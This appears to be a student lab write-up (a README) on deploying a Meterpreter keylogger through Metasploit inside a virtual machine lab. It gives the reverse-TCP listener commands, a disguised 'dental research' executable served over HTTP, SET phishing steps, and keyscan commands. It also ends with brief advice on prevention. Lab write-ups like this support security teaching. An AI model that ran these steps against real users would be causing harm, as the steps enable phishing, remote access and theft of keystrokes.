***DISCLAIMER:*** *This is intended for ethical hacking educational purpose. Performing hacking attempts on computers that you do not own (without permission) is illegal! Do not attempt to gain access to devices that you do not own!*

# <div align="center"> Keylogger</div>

## Introduction

This project details the deployment and analysis of a keylogging exploit using the Metasploit Framework. The project aims to demonstrate the process of unauthorized access and keystroke monitoring on a target machine, emphasizing the critical importance of secure coding practices and regular system updates. By leveraging the comprehensive tools provided by Metasploit, including msfvenom for payload creation and the Social-Engineer Toolkit (SET) for social engineering attacks, this project simulates a real-world cyber-attack scenario. The methodology encompasses setting up a controlled lab environment with virtual machines, configuring network settings, and executing a phishing campaign to deliver the payload. This report provides a step-by-step account of the entire process.

## Choice of Exploit

I utilized the Metasploit Framework to deploy a keylogger. This method was chosen because Metasploit offers a comprehensive set of tools for exploiting vulnerabilites and deploying payloads like keyloggers. It demonstrates the process of gaining unauthorized access then monitoring keystrokes on a target machine, emphasizing the importance of secure coding and regurlar system updates.

## Emulations Setup

***Lab Enviroment Configuration:***
- ***Attacker VM:*** Setup a Kali Linux VM to serve as the attacker's machine. This VM will create the payload with msfvenom, host it using the Pythons HTTP server, send the phishing email via SET’s Mass Email Attack feature, and then deploy keylogger to monitor keystrokes.
- ***Target VM:*** Configure a Windows VM as the target for receiving the phishing email and accessing the payload.

***NAT Network Configuration:***
- Kali Linux (Attacker) and Windows (Target) VMs should be configured to use a NAT network. This setup allows for the VMs to share the host machine’s internet connection while isolating them from the host’s network and each other.

***Disabling Windows Security Settings:***
- Turn off all security settings on the Windows target VM, including Windows Defender and any installed antivirus programs. This step is essential to allow the payload to execute without being blocked or flagged by the system’s security measures.
- Navigate to Windows Security settings and turn off features like real-time protection, cloud-delivered protection, and automatic sample submission to prevent the system from intercepting the payload.

***Payload Hosting on Attacker VM:***
- Host the “AdvancedDentalResearchFinding.exe” payload using Python’s HTTP server.
  ```python3 -m http.server```
- The payload is now accessible through the attackers VMs internal IP address on the NAT network.

***Listener Setup on Attacker VM:***
- Open msfconsole on the Kali Linux VM to configure a listener for a reverse TCP connection

  ```use exploit/multi/handler```

  ```set payload windows/meterpreter/reverse_tcp```

  ```set lhost 192.168.100.4```

  ```set lport 5555```

  ```run```

- This configuration listens for the reverse TCP connection from the payload executed on the target machine.

***Payload Delivery via SET:***
- Use the Social Engineering Toolkit (SET) within Kali Linux VM to conduct a Mass Email Attack, sending a phishing email containing a link to the hosted payload (AdvancedDentalPracticeFindings.exe).
- The email being crafted aligns with the pretext scenario, making it appear to be legitimate communication related to dental research.

***Execution on Target VM:***
- The user on the Windows VM receives the phishing email.
- Upon clicking the link and executing the downloaded file, the Windows VM initiates a reverse TCP connection to the Kali Linux VM.

***Execution on Attacker VM:***
- Check listener in msfconsole for successful reverse TCP connection.
- Use ```keyscan_start``` command in meterpreter to initiate keylogging process.
- Use ```keyscan_dump``` command in meterpreter to display the keystrokes that have been captured.

## Step-by-Step Deployment

***Payload creation with msfvenom***
<div align="center">Create the reverse TCP payload using msfvenom</div>
<p align="center"><img src=images/Picture1.jpg></p>

---

***Use Python to create HTTP server to host payload***
<p align="center"><img src=images/Picture2.jpg></p>

---

***Setup a listner using msfconsole***
<div align="center">Run msfconsole</div>
<p align="center"><img src=images/Picture3.jpg></p>
<div align="center">Use exploit/multi/handler</div>
<p align="center"><img src=images/Picture4.jpg></p>
<div align="center">Set payload windows/meterpreter/reverse_tcp</div>
<p align="center"><img src=images/Picture5.jpg></p>
<div align="center">Use show options command to display required payload options</div>
<p align="center"><img src=images/Picture6.jpg></p>
<div align="center">Set lhost to 192.168.100.4</div>
<p align="center"><img src=images/Picture7.jpg></p>
<div align="center">Use show options command to display updated payload options</div>
<p align="center"><img src=images/Picture8.jpg></p>
<div align="center">set lport to 5555 (port used by payload)</div>
<p align="center"><img src=images/Picture9.jpg></p>
<div align="center">Use show options command to display updated payload options</div>
<p align="center"><img src=images/Picture10.jpg></p>
<div align="center">Run the exploit</div>
<p align="center"><img src=images/Picture11.jpg></p>

---

***Use The Social-Engineer ToolKit (SET) to send the payload to the target***
<div align="center">Run SET and select option [1] Social-Engineering Attacks</div>
<p align="center"><img src=images/Picture12.jpg></p>
<div align="center">Select option [5] Mass Mailer Attack</div>
<p align="center"><img src=images/Picture13.jpg></p>
<div align="center">Select option [1] E-Mail Attack Single Email Address</div>
<p align="center"><img src=images/Picture14.jpg></p>
<div align="center">Select option [2] One-Time Use Email Template</div>
<p align="center"><img src=images/Picture15.jpg></p>
<div align="center">Fill in all the information for the email</div>
<p align="center"><img src=images/Picture16.png></p>

---

***Target View***
<div align="center">Email inbox view of target</div>
<p align="center"><img src=images/Picture17.png></p>
<div align="center">Email view with payload attached</div>
<p align="center"><img src=images/Picture18.png></p>
<div align="center">Target view after clicking link</div>
<p align="center"><img src=images/Picture19.jpg></p>
<div align="center">Pop up message displays when clicking the download file indicating that the file is harmful. For this demonstration, we will select keep</div>
<p align="center"><img src=images/Picture20.jpg></p>
<div align="center">Select open file</div>
<p align="center"><img src=images/Picture21.jpg></p>
<div align="center">Select Run</div>
<p align="center"><img src=images/Picture22.jpg></p>

---

***Attacker View***
<div align="center">Check listener in msfconsole for reverse TCP successful connection</div>
<p align="center"><img src=images/Picture23.jpg></p>
<div align="center">Use keyscan_start command to initiate keylogging process</div>
<p align="center"><img src=images/Picture24.jpg></p>
<div align="center">Use keyscan_dump command to display the keystrokes that have been captured</div>
<p align="center"><img src=images/Picture25.jpg></p>

## Preventative Measures

- ***Keep Systems Updated:*** Emphasize the importance of keeping all software and operating systems up to date to protect against known vulnerabilties.
- ***Install and Maintain Antivirus Software:*** Emphasize the importance of active antivirus and anit-malware solutions that detect and blcok malicious activities, including unauthorized keyloggers.
- ***Implement Firewalls:*** Utilize network firewalls to block unauthorized access to computer systems. 

## Conclusion

The keylogging project successfully demonstrated the vulnerabilities inherent in unprotected systems and the ease with which malicious actors can exploit these weaknesses using tools like the Metasploit Framework. Through the detailed execution of the exploit, it became evident that maintaining robust security measures, such as regular software updates, active antivirus solutions, and effective firewall configurations, are crucial in defending against such attacks. 

## Full Disclaimer

*Any action and or activities related to the material contained within this repository is solely your responsibility. The misuse of the tools and information in this repo could result in criminal charges being brought against the person in question. The author will not be held responsible in the event any criminal charges are brought against any individuals misusing the tools and information in this repository for malicious purpose or to break the law.*
